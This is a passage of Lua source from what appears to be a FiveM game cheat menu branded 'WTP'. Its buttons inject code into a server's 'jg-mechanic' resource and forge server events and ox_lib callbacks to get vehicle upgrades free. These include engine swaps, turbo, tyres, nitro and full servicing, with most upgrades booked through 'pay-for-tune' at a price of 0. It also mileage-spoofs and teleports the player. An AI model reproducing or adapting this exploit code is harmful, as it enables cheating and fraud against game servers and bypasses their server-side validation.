                                        local function vXmYLT9pq2()
                                            local a = PlayerPedId
                                            local b = GetVehiclePedIsIn
                                            local c = GetEntityHeading
                                            local d = SetEntityRotation

                                            local ped = a()
                                            local veh = b(ped, false)
                                            if veh and veh ~= 0 then
                                                d(veh, 0.0, 0.0, c(veh))
                                            end
                                        end

                                        vXmYLT9pq2()
                                    ]])
                                end
                            end
                        },
                    }
                },
                {
                    label = "Addon's",
                    tabs = {
                        { type = "subMenu", label = "Tuning",
                            subTabs = {
                                {
                                    type = "button",
                                    label = "Ceramic Brakes",
                                    desc = "This will add Ceramic Brakes to you're vehicle.",
                                    onSelect = function()
                                        if GetResourceState("jg-mechanic") == "started" then
                                            executeCode('jg-mechanic', [[
                                                local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                if vehicle and DoesEntityExist(vehicle) then
                                                    local plate = GetVehicleNumberPlateText(vehicle)
                                                    local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                    
                                                    local currentState = Entity(vehicle).state.tuningConfig or {}
                                                    currentState["brakes"] = 1

                                                    local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                    WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                    WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                    local upgrades = {
                                                        {type = "brakes", option = 1},
                                                    }

                                                    for _, upgrade in ipairs(upgrades) do
                                                        local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                    end
                                                end
                                            ]])
                                        else
                                            self:Notify("info", "WTP", "No found script.", 3000)
                                        end
                                    end
                                },
                                {
                                    type = "button",
                                    label = "Drift Tuning",
                                    desc = "This will add Drift Tuning to you're vehicle.",
                                    onSelect = function()
                                        if GetResourceState("jg-mechanic") == "started" then
                                            executeCode('jg-mechanic', [[
                                                local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                if vehicle and DoesEntityExist(vehicle) then
                                                    local plate = GetVehicleNumberPlateText(vehicle)
                                                    local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                    
                                                    local currentState = Entity(vehicle).state.tuningConfig or {}
                                                    currentState["driftTuning"] = 1

                                                    local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                    WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                    WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                    local upgrades = {
                                                        {type = "driftTuning", option = 1}
                                                    }

                                                    for _, upgrade in ipairs(upgrades) do
                                                        local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                    end
                                                end
                                            ]])
                                        else
                                            self:Notify("info", "WTP", "No found script.", 3000)
                                        end
                                    end
                                },
                                { icon = "", type = "scrollable", value = 1, values = { "AWD", "RWD", "FWD" }, label = "Drivetrains", desc = "This will add Drivetrains to you're vehicle.",
                                    onSelect = function(value)
                                        if value == "AWD" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["drivetrains"] = 1

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "drivetrains", option = 1}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTP", "No found script.", 3000)
                                            end
                                        elseif value == "RWD" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["drivetrains"] = 2

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "drivetrains", option = 2}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTP", "No found script.", 3000)
                                            end
                                        elseif value == "FWD" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["drivetrains"] = 3

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "drivetrains", option = 3}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTP", "No found script.", 3000)
                                            end
                                        end
                                    end
                                },
                                { icon = "", type = "scrollable", value = 1, values = { "I4 Turbo 2.5L", "V6 3.3L", "V8 6.5L", "V12 6.0L" }, label = "Engine Swaps", desc = "This will add Engine Swaps to you're vehicle.",
                                    onSelect = function(value)
                                        if value == "I4 Turbo 2.5L" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["engineSwaps"] = 1

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "engineSwaps", option = 1}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTP", "No found script.", 3000)
                                            end
                                        elseif value == "V6 3.3L" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["engineSwaps"] = 2

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "engineSwaps", option = 2}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTP", "No found script.", 3000)
                                            end
                                        elseif value == "V8 6.5L" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["engineSwaps"] = 3

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "engineSwaps", option = 3}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTP", "No found script.", 3000)
                                            end
                                        elseif value == "V12 6.0L" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["engineSwaps"] = 4

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "engineSwaps", option = 4}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTP", "No found script.", 3000)
                                            end
                                        end
                                    end
                                },
                                {
                                    type = "button",
                                    label = "Turbocharging",
                                    desc = "This will add Turbocharging to you're vehicle.",
                                    onSelect = function()
                                        if GetResourceState("jg-mechanic") == "started" then
                                            executeCode('jg-mechanic', [[
                                                local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                if vehicle and DoesEntityExist(vehicle) then
                                                    local plate = GetVehicleNumberPlateText(vehicle)
                                                    local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                    
                                                    local currentState = Entity(vehicle).state.tuningConfig or {}
                                                    currentState["turbocharging"] = true

                                                    local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                    WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                    WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                    local upgrades = {
                                                        {type = "turbocharging", option = 1},
                                                    }

                                                    for _, upgrade in ipairs(upgrades) do
                                                        local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                    end
                                                end
                                            ]])
                                        else
                                            self:Notify("info", "WTP", "No found script.", 3000)
                                        end
                                    end
                                },
                                { icon = "", type = "scrollable", value = 1, values = { "Slicks", "Semi-slicks", "Offroad" }, label = "Tyres", desc = "This will add tyres to you're vehicle.",
                                    onSelect = function(value)
                                        if value == "Slicks" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["tyres"] = 1

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "tyres", option = 1}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTP", "No found script.", 3000)
                                            end
                                        elseif value == "Semi-slicks" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["tyres"] = 2

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "tyres", option = 2}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTP", "No found script.", 3000)
                                            end
                                        elseif value == "Offroad" then
                                            if GetResourceState("jg-mechanic") == "started" then
                                                executeCode('jg-mechanic', [[
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local plate = GetVehicleNumberPlateText(vehicle)
                                                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                                        
                                                        local currentState = Entity(vehicle).state.tuningConfig or {}
                                                        currentState["tyres"] = 3

                                                        local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                                        WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                                        WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                                        local upgrades = {
                                                            {type = "tyres", option = 3}
                                                        }

                                                        for _, upgrade in ipairs(upgrades) do
                                                            local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                                        end
                                                    end
                                                ]])
                                            else
                                                self:Notify("info", "WTP", "No found script.", 3000)
                                            end
                                        end
                                    end
                                },
                            }
                        },
                        {
                            type = "button",
                            label = "Pms",
                            desc = "This will repair all PMS to you're vehicle.",
                            onSelect = function()
                                if GetResourceState("jg-mechanic") == "started" then
                                    executeCode('jg-mechanic', [[
                                        local currentVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                        if currentVehicle and currentVehicle ~= 0 then
                                            local plate = GetVehicleNumberPlateText(currentVehicle)
                                            if plate then
                                                plate = string.gsub(plate, "^%s*(.-)%s*$", "%1")
                                            end

                                            local perfectServicingData = {
                                                suspension = 100, tyres = 100, brakePads = 100, engineOil = 100,
                                                clutch = 100, airFilter = 100, sparkPlugs = 100, evMotor = 100,
                                                evBattery = 100, evCoolant = 100
                                            }

                                            local networkId = NetworkGetNetworkIdFromEntity(currentVehicle)
                                            local stateBagName = string.format("entity:%s", networkId)

                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", "jg-mechanic:server:set-vehicle-statebag:34179", networkId, "servicingData", perfectServicingData) 
                                            WTP.SafeRunNative(TriggerServerEvent, 'jg-vehiclemileage:server:updateVehicleMileage', plate, 1)
                                        end
                                    ]])
                                else
                                    self:Notify("info", "WTP", "No found script.", 3000)
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "V12",
                            desc = "This will add V12 to you're vehicle.",
                            onSelect = function()
                                if GetResourceState("jg-mechanic") == "started" then
                                    executeCode('jg-mechanic', [[
                                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                        if vehicle and DoesEntityExist(vehicle) then
                                            local plate = GetVehicleNumberPlateText(vehicle)
                                            local netId = NetworkGetNetworkIdFromEntity(vehicle)
                                            
                                            local currentState = Entity(vehicle).state.tuningConfig or {}
                                            currentState["engineSwaps"] = 4
                                            currentState["brakes"] = 1
                                            currentState["drivetrains"] = 1
                                            currentState["tyres"] = 1
                                            currentState["turbocharging"] = true

                                            local statebagEventId = "jg-mechanic:server:set-vehicle-statebag:" .. math.random(10000, 99999)
                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:set-vehicle-statebag', "jg-mechanic", statebagEventId, netId, "tuningConfig", currentState) 
                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:set-vehicle-statebag", "jg-mechanic", statebagEventId)

                                            local upgrades = {
                                                {type = "engineSwaps", option = 4},
                                                {type = "brakes", option = 1},
                                                {type = "drivetrains", option = 1},
                                                {type = "tyres", option = 1},
                                                {type = "turbocharging", option = 1}
                                            }

                                            for _, upgrade in ipairs(upgrades) do
                                                local saveEventId = "jg-mechanic:server:pay-for-tune:" .. math.random(10000, 99999)
                                                WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:pay-for-tune', "jg-mechanic", saveEventId, upgrade.type, upgrade.option, 0, plate)
                                                WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:pay-for-tune", "jg-mechanic", saveEventId)
                                            end
                                        end
                                    ]])
                                else
                                    self:Notify("info", "WTP", "No found script.", 3000)
                                end
                            end
                        },
                        { type = "slider", label = "Nitro", desc = "This will add nitro to you're vehicle.", scrollType = "onEnter", value = 1, min = 0, max = 3, step = 1.0,
                            onSelect = function(value)
                                if GetResourceState("jg-mechanic") == "started" then
                                    executeCode('jg-mechanic', string.format([[
                                        local ped = PlayerPedId()
                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                        local nitroAmount = %s

                                        if vehicle and vehicle ~= 0 then
                                            WTP.SafeRunNative(TriggerServerEvent, '__ox_cb_jg-mechanic:server:install-new-bottle', "jg-mechanic", "jg-mechanic:server:install-new-bottle:11050") 
                                            WTP.SafeRunNative(TriggerServerEvent, 'ox_lib:validateCallback', "jg-mechanic:server:install-new-bottle", "jg-mechanic", "jg-mechanic:server:install-new-bottle:11050")
                                            
                                            local nitrousProps = {
                                                nitrousInstalledBottles = nitroAmount,
                                                nitrousFilledBottles = nitroAmount,
                                                nitrousCapacity = 10.0
                                            }
                                            
                                            exports['jg-mechanic']:setVehicleProperties(vehicle, nitrousProps, true)
                                        end
                                    ]], value))
                                else
                                    self:Notify("info", "WTP", "No found script.", 3000)
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = 'ph-map-pin',
            label = "Teleport Options",
            type = "subMenu",
            categories = {
                {
                    label = "Teleport",
                    tabs = {
                        {
                            type = "button",
                            label = "Teleport to Waypoint",
                            icon = "",
                            onSelect = function()
                                executeCode('any', [[
                                    local function getSafeGroundZ(x, y, fallbackZ)
                                        local foundGround, groundZ = false, fallbackZ

                                        for height = 0.0, 1000.0, 25.0 do
                                            foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                                            if foundGround then
                                                return groundZ + 1.0
                                            end
                                        end

                                        return fallbackZ + 1.0
                                    end

                                    local blip = GetFirstBlipInfoId(8)
                                    if not DoesBlipExist(blip) then
                                        return
                                    end

                                    local coords = GetBlipInfoIdCoord(blip)
                                    local ped = PlayerPedId()
                                    if not DoesEntityExist(ped) then
                                        return
                                    end

                                    local safeZ = getSafeGroundZ(coords.x, coords.y, coords.z)

                                    local entityToCheck = ped
                                    if IsPedInAnyVehicle(ped, false) then
                                        entityToCheck = GetVehiclePedIsIn(ped, false)
                                    end

                                    WTP.SafeRunNative(RequestCollisionAtCoord, coords.x, coords.y, safeZ)
                                    WTP.SafeRunNative(FreezeEntityPosition, entityToCheck, true)
                                    WTP.SafeRunNative(SetPedCoordsKeepVehicle, ped, coords.x, coords.y, safeZ)

                                    local startTime = GetGameTimer()
                                    while (GetGameTimer() - startTime) < 5000 do
                                        WTP.SafeRunNative(RequestCollisionAtCoord, coords.x, coords.y, safeZ)

                                        if HasCollisionLoadedAroundEntity(entityToCheck) then
                                            break
                                        end

                                        WTP.SafeRunNative(Wait, 50)
                                    end

                                    WTP.SafeRunNative(FreezeEntityPosition, entityToCheck, false)
                                ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Teleport to Grove",
                            icon = "",
                            onSelect = function()
                                executeCode('any', [[
                                    local targetX, targetY, targetZ = 100.0, -1940.0, 20.3

                                    local function getSafeGroundZ(x, y, fallbackZ)
                                        local foundGround, groundZ = false, fallbackZ

                                        for height = 0.0, 1000.0, 25.0 do
                                            foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                                            if foundGround then
                                                return groundZ + 1.0
                                            end
                                        end

                                        return fallbackZ + 1.0
                                    end

                                    local ped = PlayerPedId()
                                    if not DoesEntityExist(ped) then
                                        return
                                    end

                                    local entityToTeleport = ped
                                    if IsPedInAnyVehicle(ped, false) then
                                        entityToTeleport = GetVehiclePedIsIn(ped, false)
                                    end

                                    local safeZ = getSafeGroundZ(targetX, targetY, targetZ)
                                    WTP.SafeRunNative(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                    WTP.SafeRunNative(FreezeEntityPosition, entityToTeleport, true)
                                    WTP.SafeRunNative(SetEntityCoords, entityToTeleport, targetX, targetY, safeZ, false, false, false, true)
                                    
                                    local startTime = GetGameTimer()
                                    while (GetGameTimer() - startTime) < 5000 do
                                        WTP.SafeRunNative(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                        if HasCollisionLoadedAroundEntity(entityToTeleport) then
                                            break
                                        end

                                        WTP.SafeRunNative(Wait, 50)
                                    end

                                    WTP.SafeRunNative(FreezeEntityPosition, entityToTeleport, false)
                                ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Teleport to Legion Square",
                            icon = "",
                            onSelect = function()
                                executeCode('any', [[
                                    local targetX, targetY, targetZ = 224.17, -869.13, 30.49

                                    local function getSafeGroundZ(x, y, fallbackZ)
                                        local foundGround, groundZ = false, fallbackZ
                                        for height = 0.0, 1000.0, 25.0 do
                                            foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                                            if foundGround then
                                                return groundZ + 1.0
                                            end
                                        end
                                        return fallbackZ + 1.0
                                    end

                                    local ped = PlayerPedId()
                                    if not DoesEntityExist(ped) then return end

                                    local entityToTeleport = ped
                                    if IsPedInAnyVehicle(ped, false) then
                                        entityToTeleport = GetVehiclePedIsIn(ped, false)
                                    end

